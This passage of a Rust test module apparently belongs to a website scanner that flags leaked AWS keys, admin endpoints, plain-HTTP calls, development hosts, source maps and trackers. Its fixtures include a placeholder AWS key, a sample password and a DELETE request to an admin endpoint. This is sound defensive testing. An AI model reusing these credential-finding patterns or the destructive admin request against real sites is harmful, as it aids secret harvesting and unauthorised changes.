            ]
        );
        assert_eq!(form("Form: POST /avatar"), ["Takes file uploads"]);
        assert!(!site.signals.iter().any(
            |s| s.evidence.contains("letmein1") || s.evidence.contains("a8f5f167f44f4964e6c9")
        ));
        let upload = site.requests.iter().find(|r| r.url == "/upload").unwrap();
        assert_eq!(upload.method, "POST");
        assert_eq!(upload.params, ["doc", "api_key"]);
        // Every issue is marked in the page.
        assert!(site
            .signals
            .iter()
            .flat_map(|s| &s.issues)
            .all(|i| i.mark.is_some()));
    }

    #[test]
    fn reads_the_sites_own_code() {
        let root = Url::parse("https://shop.example").unwrap();
        let mut requests = Vec::new();
        let code = r#"const KEY="AKIAIOSFODNN7EXAMPLE";fetch("/api/admin/users",{method:"DELETE"});
            axios.post("http://api.shop.example/v1/orders");const dev="http://localhost:3000/api";"#;
        let out = own_code(
            &mut requests,
            &root,
            code,
            here("https://shop.example/app.js"),
        );
        let labels: Vec<&str> = out.iter().map(|s| s.label.as_str()).collect();
        assert!(labels.contains(&"AWS access key"));
        assert!(labels.contains(&"Calls an admin endpoint: /api/admin/users"));
        assert!(labels.contains(&"Sends requests over plain HTTP"));
        assert!(labels.contains(&"Names a development address"));
        let admin = out.iter().find(|s| s.label.starts_with("Calls")).unwrap();
        let (s, e) = admin.span.unwrap();
        assert_eq!(&code[s..e], "/api/admin/users");
        assert!(requests
            .iter()
            .any(|r| r.method == "DELETE" && r.url == "/api/admin/users"));
    }

    #[test]
    fn finds_source_maps() {
        let code = "x();\n//# sourceMappingURL=app.js.map";
        let (span, name) = source_map(code).unwrap();
        assert_eq!(name, "app.js.map");
        assert_eq!(&code[span.0..span.1], "sourceMappingURL=app.js.map");
        assert_eq!(clean_source("webpack://shop/./src/api.js"), "src/api.js");
        assert_eq!(clean_source("../src/a.ts"), "src/a.ts");
        assert!(dev_host("127.0.0.1") && dev_host("api.internal") && !dev_host("8.8.8.8"));
    }

    #[test]
    fn reads_routes_from_scripts() {
        let code = r#"const r=[{path:"/docs"},{path:'/docs/install'}];go(`/blog/`);x="/assets/a.png";y="//cdn";z="/2";w="a/b""#;
        assert_eq!(routes(code), ["/docs", "/docs/install", "/blog/"]);
    }

    #[test]
    fn keeps_links_to_other_hosts() {
        let root = Url::parse("https://shop.example").unwrap();
        let mut site = Site::default();
        let code = r#"a="https://docs.shop.example/start";b='https://shop.example/x';c=`https://cdn.example/a.js`"#;
        for address in addresses(code) {
            link_out(&mut site, &root, Url::parse(address).unwrap());
        }
        assert_eq!(
            site.links,
            [
                "https://docs.shop.example/start",
                "https://cdn.example/a.js"
            ]
        );
    }

    #[test]
    fn upgrading_to_https_is_not_leaving() {
        let http = Url::parse("http://shop.example").unwrap();
        assert!(same_site(
            &http,
            &Url::parse("https://shop.example/").unwrap()
        ));
        assert!(same_site(
            &http,
            &Url::parse("https://www.shop.example/").unwrap()
        ));
        assert!(!same_site(
            &http,
            &Url::parse("https://other.example/").unwrap()
        ));
    }

    #[test]
    fn finds_trackers_and_sitemap_locs() {
        let out = trackers("https://static.hotjar.com/c/hotjar-1.js", here("x"));
        assert_eq!(out[0].category, "Session recording");
        assert_eq!(
            between(
                "<url><loc>a</loc></url><url><loc>b</loc></url>",
                "<loc>",
                "</loc>"
            ),
            ["a", "b"]
        );
    }
}
